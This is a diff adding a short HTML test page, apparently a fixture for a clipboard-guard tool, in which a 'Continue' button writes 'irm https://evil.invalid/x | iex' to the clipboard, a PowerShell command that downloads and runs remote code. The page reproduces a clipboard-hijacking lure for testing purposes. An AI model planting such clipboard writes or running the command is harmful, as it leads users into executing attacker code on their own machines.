@@ -1,0 +1,7 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Click + ClipboardItem (deferred)</title>
+<script src="common.js"></script></head>
+<body><h1>Click + ClipboardItem (deferred)</h1>
+<button id="go">Continue</button>
+<script>document.getElementById("go").addEventListener("click",()=>window.__clipguard.writeItem(`irm https://evil.invalid/x | iex`));</script>
+</body></html>
